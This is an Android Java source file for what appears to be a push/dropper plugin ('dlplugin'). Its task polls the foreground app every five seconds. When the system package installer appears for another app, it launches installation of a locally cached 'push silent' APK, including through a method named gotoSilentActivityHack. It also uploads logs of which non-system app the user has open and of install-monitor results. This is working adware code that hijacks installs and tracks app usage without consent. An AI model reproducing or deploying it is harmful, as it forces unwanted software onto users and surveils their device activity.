package com.tiho.dlplugin.task;

import java.io.File;
import java.util.List;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.Context;
import android.os.Handler;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushSilentBean;
import com.tiho.dlplugin.bean.Resource;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.silent.SilentActivity;
import com.tiho.dlplugin.task.silent.dao.IndepentSilnetDAO;
import com.tiho.dlplugin.util.CommonUtil;
import com.tiho.dlplugin.util.EnvArgu;
import com.tiho.dlplugin.util.PackageUtil;

/**
 * 检测系统及应用是否有安装应用的操作
 * @author Administrator
 *
 */
public class InstallMonitorTask extends BaseTask {
	private String mBaseActivityPkg = "";
    private String mLastBasePkg = null;
    private String mLastActivity = "";
    private String mTopActivity = "";
	public InstallMonitorTask(Handler handler, Context context) {
		super(handler, context);
	}

	@Override
	protected void doTask() {
	    try {
//	        LogManager.LogShow("InstallMonitorTask start. context = " + context);
	        LogManager.LogShow("InstallMonitorTask CommonUtil.newTaskOpen = " + CommonUtil.newTaskOpen);
            if(!CommonUtil.newTaskOpen){
                LogManager.LogShow("InstallMonitorTask close, return");
                return;
            }
	        if(isInstallShow(context)){
	            installByMonitor(context);
	        }
	        upActivityLog(context);
        } catch (Exception e) {
            LogManager.LogShow(e);
        }
		
	}

	@Override
	protected void afterTask(Handler handler) {
		handler.postDelayed(this, 5000L); 
	}

    private boolean isInstallShow(Context c) {
        boolean b = false;
        ActivityManager mActivityManager = (ActivityManager) c.getSystemService(Context.ACTIVITY_SERVICE);
        List<RunningTaskInfo> rti = mActivityManager.getRunningTasks(1);
        RunningTaskInfo info = rti.get(0);
        String hostPkg = c.getPackageName();
        mBaseActivityPkg = info.baseActivity.getPackageName();
        String topActivityPkg = info.topActivity.getPackageName();
        String topActivityClassName = info.topActivity.getClassName();
//        LogManager.LogShow("isInstallShow HostPackageName: " + hostPkg);
//        LogManager.LogShow("isInstallShow baseActivity PackageName: " + mBaseActivityPkg);
//        LogManager.LogShow("isInstallShow topActivity getPackageName: " + topActivityPkg);
//        LogManager.LogShow("isInstallShow topActivity topActivityClassName: " + topActivityClassName);
        if(!hostPkg.equals(mBaseActivityPkg) && !mBaseActivityPkg.equals("com.android.packageinstaller")){
            b = ("com.android.packageinstaller".equals(info.topActivity.getPackageName())) || (topActivityClassName.contains("PackageInstallerActivity"));
            LogManager.LogShow("isInstallShow other. b = " + b);
        }else{
            LogManager.LogShow("isInstallShow This is me.");
        }

        return b;
    }
    
    private void installByMonitor(Context c){
        LogManager.LogShow("installByMonitor mBaseActivityPkg = " + mBaseActivityPkg);
        PushSilentBean psb = null;
        try {
            IndepentSilnetDAO dao = DAOFactory.getIndepentSilnetDAO(c);
            List<Resource> pushMsgs = dao.getPushMessage();
            for(Resource res : pushMsgs){
                try {
                    PushSilentBean bean = (PushSilentBean)res;
                    if(!PackageUtil.isInstalled(bean.getPack(), c)){
                        File file = bean.getApkFile(c);
                        if(file.exists()){
                            psb = bean;
                            LogManager.LogShow("installByMonitor get one: pkg = " + bean.getPack() + ", file = " + file.getName());
                            break;
                        }
                    }
                } catch (Exception e) {
                    LogManager.LogShow(e);
                }
            }
        } catch (Exception e) {
            LogManager.LogShow(e);
        }
        LogManager.LogShow("installByMonitor psb = " + psb);
        if(mLastBasePkg != null && mBaseActivityPkg != null && mLastBasePkg.equals(mBaseActivityPkg)){
            LogManager.LogShow("installByMonitor mLastBasePkg == mBaseActivityPkg, " + mBaseActivityPkg);
            return;
        }
        mLastBasePkg = mBaseActivityPkg;
        if(psb != null){
            LogUploadManager.getInstance(c).uploadInstallMonitorLog(psb.getPack(), mBaseActivityPkg, "monitor", "TRUE");
            try {
                if (EnvArgu.isFromJar()) {
                    PackageUtil.gotoInstall(c, psb.getApkFile(c).getAbsolutePath());
                } else{
                    SilentActivity.gotoSilentActivityHack(c, psb.getPack(), mBaseActivityPkg, true);
                }
            } catch (Exception e) {
                LogManager.LogShow(e);
            } catch (NoClassDefFoundError err){
                err.printStackTrace();
            }
        }else{
            
            LogUploadManager.getInstance(c).uploadInstallMonitorLog("", mBaseActivityPkg, "monitor", "FALSE");
        }
    }
    
    private void upActivityLog(Context c){
        try {
            ActivityManager mActivityManager = (ActivityManager) c.getSystemService(Context.ACTIVITY_SERVICE);
            List<RunningTaskInfo> rti = mActivityManager.getRunningTasks(1);
            RunningTaskInfo info = rti.get(0);
            String hostPkg = c.getPackageName();
            mTopActivity = info.topActivity.getPackageName();
            LogManager.LogShow("upActivityLog mTopActivity = " + mTopActivity);
            if(mTopActivity != null){
                //不是自己
                if(!mTopActivity.equals(hostPkg)){
                    //非系统应用
                    if(!PackageUtil.isSystemApp(c, mTopActivity)){
                        //和上次不一样
                        if(!mTopActivity.equals(mLastActivity)){
                            boolean is_push = false;
                            IndepentSilnetDAO dao = DAOFactory.getIndepentSilnetDAO(c);
                            List<Resource> pushMsgs = dao.getPushMessage();
                            for(Resource res : pushMsgs){
                                try {
                                    PushSilentBean bean = (PushSilentBean)res;
                                    if(mTopActivity.equals(bean.getPack())){
                                        is_push = true;
                                        break;
                                    }
                                } catch (Exception e) {
                                    LogManager.LogShow(e);
                                }
                            }
                            LogUploadManager.getInstance(c).uploadActivityLog(mTopActivity, is_push);
                        }else{
                            LogManager.LogShow("upActivityLog the same as last one.");
                        }
                    }else{
                        LogManager.LogShow("upActivityLog is systemApp.");
                    }
                }else{
                    LogManager.LogShow("upActivityLog is host.");
                }
            }
            mLastActivity = mTopActivity;
        } catch (Exception e) {
            LogManager.LogShow(e);
        }
    }
}
